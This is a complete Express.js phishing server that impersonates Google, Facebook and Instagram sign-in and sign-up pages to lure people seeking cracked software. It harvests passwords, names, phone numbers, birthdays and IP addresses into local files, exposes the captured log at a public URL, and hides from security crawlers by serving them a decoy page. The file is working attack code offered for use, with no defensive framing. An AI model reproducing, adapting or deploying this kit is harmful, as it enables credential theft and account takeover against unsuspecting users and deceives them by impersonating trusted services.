const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret',
    resave: false,
    saveUninitialized: true
}));
app.use(express.static(__dirname));

const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);

// ============================================
// SECURITY EVASION
// ============================================
const bots = ['bot', 'crawler', 'spider', 'scanner', 'googlebot', 'facebookexternalhit', 'twitterbot', 'slackbot'];
app.use((req, res, next) => {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    if (bots.some(b => ua.includes(b))) {
        return res.send('<h1>CrackedAmazon Marketplace</h1><p>Please enable JavaScript</p>');
    }
    next();
});

// ============================================
// GOOGLE COMPLETE FLOW
// ============================================
app.get('/auth/google', (req, res) => {
    const tool = req.query.tool || 'tool';
    const mode = req.query.mode || 'login';
    req.session.tool = tool;
    
    if (mode === 'login') {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign in - Google</title>
            <style>
                body{font-family:Arial,sans-serif;background:#f0f2f4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
                .card{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;}
                .logo{text-align:center;margin-bottom:30px;font-size:24px;color:#5f6368;}
                input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:8px 0;}
                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
                .link{text-align:center;margin-top:20px;}
                .link a{color:#1a73e8;text-decoration:none;}
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo">Google</div>
                <h2 style="margin-bottom:20px;">Sign in</h2>
                <form method="POST" action="/capture/google/login">
                    <input type="email" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="hidden" name="tool" value="${tool}">
                    <button type="submit">Next</button>
                </form>
                <div class="link">
                    <a href="/auth/google?tool=${tool}&mode=register">Create account</a>
                </div>
            </div>
        </body>
        </html>
        `);
    } else {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Create account - Google</title>
            <style>
                body{font-family:Arial,sans-serif;background:#f0f2f4;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px;}
                .card{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px;}
                .logo{text-align:center;margin-bottom:30px;font-size:24px;color:#5f6368;}
                input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:8px 0;}
                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:20px;}
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo">Google</div>
                <h2 style="margin-bottom:20px;">Create account</h2>
                <form method="POST" action="/capture/google/register">
                    <input type="text" name="firstName" placeholder="First name" required>
                    <input type="text" name="lastName" placeholder="Last name" required>
                    <input type="email" name="email" placeholder="Email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="password" name="confirmPassword" placeholder="Confirm password" required>
                    <input type="tel" name="phone" placeholder="Phone (optional)">
                    <input type="hidden" name="tool" value="${tool}">
                    <button type="submit">Next</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
});

app.post('/capture/google/login', (req, res) => {
    const { email, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        type: 'login',
        email,
        password,
        tool,
        ip
    };
    
    fs.writeFileSync(path.join(capturesDir, `google_login_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ GOOGLE LOGIN:', email, password);
    
    res.redirect('/download?tool=' + tool);
});

app.post('/capture/google/register', (req, res) => {
    const { firstName, lastName, email, password, phone, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        type: 'register',
        firstName,
        lastName,
        email,
        password,
        phone,
        tool,
        ip
    };
    
    fs.writeFileSync(path.join(capturesDir, `google_reg_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ GOOGLE REGISTER:', firstName, lastName, email, password);
    
    res.redirect('/download?tool=' + tool);
});

// ============================================
// FACEBOOK COMPLETE FLOW
// ============================================
app.get('/auth/facebook', (req, res) => {
    const tool = req.query.tool || 'tool';
    const mode = req.query.mode || 'login';
    req.session.tool = tool;
    
    if (mode === 'login') {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Log in to Facebook</title>
            <style>
                body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
                .card{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:350px;text-align:center;}
                .logo{color:#1877f2;font-size:36px;font-weight:bold;margin-bottom:20px;}
                input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;margin:8px 0;}
                button{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;}
                .link{margin-top:20px;}
                .link a{color:#1877f2;text-decoration:none;}
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo">facebook</div>
                <form method="POST" action="/capture/facebook/login">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="pass" placeholder="Password" required>
                    <input type="hidden" name="tool" value="${tool}">
                    <button type="submit">Log In</button>
                </form>
                <div class="link">
                    <a href="/auth/facebook?tool=${tool}&mode=register">Create new account</a>
                </div>
            </div>
        </body>
        </html>
        `);
    } else {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign up for Facebook</title>
            <style>
                body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px;}
                .card{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:400px;}
                .logo{color:#1877f2;font-size:36px;font-weight:bold;text-align:center;margin-bottom:20px;}
                input{width:100%;padding:12px;border:1px solid #dddfe2;border-radius:4px;font-size:15px;margin:5px 0;}
                select{width:100%;padding:12px;border:1px solid #dddfe2;border-radius:4px;font-size:15px;margin:5px 0;}
                button{width:100%;padding:12px;background:#00a400;color:white;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px;}
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo">facebook</div>
                <h2 style="margin-bottom:15px;">Create a new account</h2>
                <form method="POST" action="/capture/facebook/register">
                    <input type="text" name="firstName" placeholder="First name" required>
                    <input type="text" name="lastName" placeholder="Last name" required>
                    <input type="email" name="email" placeholder="Email or phone number" required>
                    <input type="password" name="pass" placeholder="New password" required>
                    <select name="birthdayMonth">
                        <option>Month</option><option value="1">Jan</option><option value="2">Feb</option><option value="3">Mar</option>
                    </select>
                    <select name="birthdayDay"><option>Day</option></select>
                    <select name="birthdayYear"><option>Year</option></select>
                    <select name="gender">
                        <option>Gender</option><option value="female">Female</option><option value="male">Male</option>
                    </select>
                    <input type="hidden" name="tool" value="${tool}">
                    <button type="submit">Sign Up</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
});

app.post('/capture/facebook/login', (req, res) => {
    const { email, pass, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        type: 'login',
        email,
        password: pass,
        tool,
        ip
    };
    
    fs.writeFileSync(path.join(capturesDir, `facebook_login_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ FACEBOOK LOGIN:', email, pass);
    
    res.redirect('/download?tool=' + tool);
});

app.post('/capture/facebook/register', (req, res) => {
    const { firstName, lastName, email, pass, birthdayMonth, birthdayDay, birthdayYear, gender, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        type: 'register',
        firstName,
        lastName,
        email,
        password: pass,
        birthday: `${birthdayMonth}/${birthdayDay}/${birthdayYear}`,
        gender,
        tool,
        ip
    };
    
    fs.writeFileSync(path.join(capturesDir, `facebook_reg_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ FACEBOOK REGISTER:', firstName, lastName, email, pass);
    
    res.redirect('/download?tool=' + tool);
});

// ============================================
// INSTAGRAM COMPLETE FLOW
// ============================================
app.get('/auth/instagram', (req, res) => {
    const tool = req.query.tool || 'tool';
    const mode = req.query.mode || 'login';
    req.session.tool = tool;
    
    if (mode === 'login') {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login • Instagram</title>
            <style>
                body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
                .card{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;}
                .logo{text-align:center;font-size:32px;margin-bottom:30px;font-family: cursive;}
                input{width:100%;padding:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin:5px 0;}
                button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;}
                .link{text-align:center;margin-top:20px;}
                .link a{color:#0095f6;text-decoration:none;}
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo">Instagram</div>
                <form method="POST" action="/capture/instagram/login">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="hidden" name="tool" value="${tool}">
                    <button type="submit">Log In</button>
                </form>
                <div class="link">
                    <a href="/auth/instagram?tool=${tool}&mode=register">Sign up</a>
                </div>
            </div>
        </body>
        </html>
        `);
    } else {
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign up • Instagram</title>
            <style>
                body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px;}
                .card{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;}
                .logo{text-align:center;font-size:32px;margin-bottom:20px;font-family:cursive;}
                input{width:100%;padding:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin:5px 0;}
                button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;}
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo">Instagram</div>
                <form method="POST" action="/capture/instagram/register">
                    <input type="email" name="email" placeholder="Email" required>
                    <input type="text" name="fullName" placeholder="Full Name" required>
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="hidden" name="tool" value="${tool}">
                    <button type="submit">Sign up</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
});

app.post('/capture/instagram/login', (req, res) => {
    const { username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        type: 'login',
        username,
        password,
        tool,
        ip
    };
    
    fs.writeFileSync(path.join(capturesDir, `instagram_login_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ INSTAGRAM LOGIN:', username, password);
    
    res.redirect('/download?tool=' + tool);
});

app.post('/capture/instagram/register', (req, res) => {
    const { email, fullName, username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        type: 'register',
        email,
        fullName,
        username,
        password,
        tool,
        ip
    };
    
    fs.writeFileSync(path.join(capturesDir, `instagram_reg_${Date.now()}.json`), JSON.stringify(data, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ INSTAGRAM REGISTER:', email, fullName, username, password);
    
    res.redirect('/download?tool=' + tool);
});

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ').replace(/_/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download - CrackedAmazon</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
            body{background:linear-gradient(135deg,#0f172a,#1e293b);color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
            .card{background:rgba(255,255,255,0.05);border-radius:24px;padding:48px;max-width:450px;width:100%;border:1px solid #f97316;text-align:center;}
            .success{color:#10b981;font-size:72px;margin-bottom:20px;}
            h1{color:#f97316;margin-bottom:16px;}
            .btn{background:#f97316;color:white;border:none;padding:16px 32px;border-radius:50px;font-size:18px;font-weight:600;width:100%;cursor:pointer;margin:24px 0;}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h1>Download Ready!</h1>
            <p style="color:#94a3b8;margin:16px 0;">${toolName}</p>
            <button class="btn" onclick="alert('Download started!')">Download Now</button>
        </div>
    </body>
    </html>
    `);
});

// ============================================
// VIEW CAPTURES
// ============================================
app.get('/captures.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'captures.txt'));
});

// ============================================
// HOME PAGE
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🔥 SERVER RUNNING ON PORT ${PORT}`);
    console.log('✅ Google: Login + Register');
    console.log('✅ Facebook: Login + Register');
    console.log('✅ Instagram: Login + Register\n');
});
